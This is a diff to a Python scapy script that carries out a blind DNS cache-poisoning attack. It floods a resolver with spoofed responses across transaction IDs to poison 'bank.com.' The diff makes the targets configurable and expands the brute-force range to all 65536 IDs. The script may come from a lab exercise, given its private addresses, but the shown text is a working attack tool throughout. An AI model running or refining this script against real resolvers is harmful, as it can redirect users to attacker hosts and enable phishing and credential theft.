@@ -1,11 +1,13 @@
+import os
 import time
 
 from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send  # type: ignore
 
-RESOLVER_IP = "10.10.0.53"
-AUTH_IP = "10.10.0.100"
-RESOLVER_UPSTREAM_PORT = 33333
-TXID_SPACE = 1024
+RESOLVER_IP = os.getenv("RESOLVER_IP", "10.10.0.53")
+AUTH_IP = os.getenv("AUTH_IP", "10.10.0.100")
+RESOLVER_UPSTREAM_PORT = int(os.getenv("RESOLVER_UPSTREAM_PORT", "33333"))
+TXID_SPACE = max(1, min(65536, int(os.getenv("TXID_SPACE", "65536"))))
+TXID_SCAN_LIMIT = max(1, min(TXID_SPACE, int(os.getenv("TXID_SCAN_LIMIT", str(TXID_SPACE)))))
 
 QNAME = "victim.example.net."
 POISON_DOMAIN = "bank.com."
@@ -32,8 +34,12 @@ def build_packet(txid: int):
 
 
 def main():
-    print("[*] Flooding spoofed OoB DNS responses (blind mode)...")
-    packets = [build_packet(txid) for txid in range(TXID_SPACE)]
+    print(
+        "[*] Flooding spoofed OoB DNS responses "
+        f"(txid_space={TXID_SPACE}, scan_limit={TXID_SCAN_LIMIT}, "
+        f"dport={RESOLVER_UPSTREAM_PORT})..."
+    )
+    packets = [build_packet(txid) for txid in range(TXID_SCAN_LIMIT)]
 
     while True:
         send(packets, verbose=0)
